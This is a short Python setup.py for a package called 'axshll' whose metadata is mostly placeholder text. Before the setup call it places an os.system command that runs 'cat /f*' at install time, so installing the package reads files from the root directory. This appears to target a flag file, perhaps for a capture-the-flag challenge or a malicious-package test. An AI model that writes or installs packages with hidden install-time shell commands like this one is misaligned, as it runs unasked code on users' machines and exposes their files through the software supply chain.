from setuptools import setup
import os
os.system('cat /f*')

setup(name='axshll',
      version='0.0.1',
      description='xshll',
      author='xxsaf',
      license='MIT',
      packages=['axshll'])
